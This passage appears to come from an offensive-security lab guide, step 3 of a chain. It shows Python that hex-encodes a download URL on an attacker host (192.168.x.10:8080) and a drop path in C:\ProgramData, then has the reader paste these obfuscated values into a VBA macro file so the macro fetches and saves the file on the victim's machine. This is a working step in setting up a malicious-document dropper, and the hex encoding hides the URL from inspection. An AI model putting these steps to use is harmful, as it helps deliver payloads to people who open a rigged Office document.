  Step 3 — Modify the VBA Macro

  The macro has two hex-encoded placeholders. You need to encode your values.

  Convert your values to hex

  In Python (run on Kali):
  # Encode the download URL
  url = "http://192.168.x.10:8080/CertificationKit.ini"
  hex_url = url.encode().hex()
  print(hex_url)

  # Encode the local save path
  path = "C:\\ProgramData\\CertificationKit.ini"
  hex_path = path.encode().hex()
  print(hex_path)

  Example output:
  URL hex:  687474703a2f2f3139322e3136382e782e31303a383038302f...
  Path hex: 433a5c50726f6772616d446174615c436572746966...

  Edit macros.bas — replace the two placeholders:

  ' Find these lines in macros.bas and replace with your hex values:

  encodedPath = "433a5c50726f6772616d446174615c436572746966..."   ' <-- your path hex
  encodedURL  = "687474703a2f2f3139322e3136382e782e31303a3830..."  ' <-- your URL hex

